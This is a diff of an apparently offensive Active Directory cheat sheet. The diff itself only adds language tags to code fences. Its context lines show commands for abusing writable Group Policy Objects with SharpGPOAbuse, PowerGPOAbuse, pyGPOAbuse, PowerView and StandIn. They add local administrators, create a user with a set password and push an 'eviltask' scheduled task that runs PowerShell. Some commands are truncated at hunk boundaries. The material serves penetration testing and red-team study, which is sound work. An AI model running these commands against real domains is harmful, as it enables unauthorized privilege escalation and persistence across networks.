@@ -16,13 +16,13 @@ Domain members refresh group policy settings every 90 minutes by default but it 
 
 Look a GPLink where you have the **Write** right.
 
-```
+```powershell
 Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
 ```
 
 <mark style="color:green;">**Abuse GPO with SharpGPOAbuse**</mark>
 
-```
+```powershell
 # Build and configure SharpGPOAbuse
 git clone https://github.com/FSecureLABS/SharpGPOAbuse
 Install-Package CommandLineParser -Version 1.9.3.15
@@ -45,7 +45,7 @@ ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\Co
 
 <mark style="color:green;">**Abuse GPO with**</mark>[ **PowerGPOAbuse**](https://github.com/rootSySdk/PowerGPOAbuse)
 
-```
+```powerquery
 PS> . .\PowerGPOAbuse.ps1
 
 # Adding a localadmin 
@@ -63,7 +63,7 @@ PS> Add-UserTask/Add-ComputerTask -TaskName 'eviltask' -Command 'powershell.exe 
 
 <mark style="color:green;">**Abuse GPO with pyGPOAbuse**</mark>
 
-```
+```powershell
 git clone https://github.com/Hackndo/pyGPOAbuse
 
 # Add john user to local administrators group (Password: H4x00r123..)
@@ -80,7 +80,7 @@ git clone https://github.com/Hackndo/pyGPOAbuse
 
 **A**<mark style="color:green;">**buse GPO with PowerView**</mark>
 
-```
+```powershell
 # Enumerate GPO
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
 
@@ -90,7 +90,7 @@ New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArgumen
 
 <mark style="color:green;">**Abuse GPO with StandIn**</mark>
 
-```
+```powershell
 # Add a local administrator
 StandIn.exe --gpo --filter Shards --localadmin user002
 
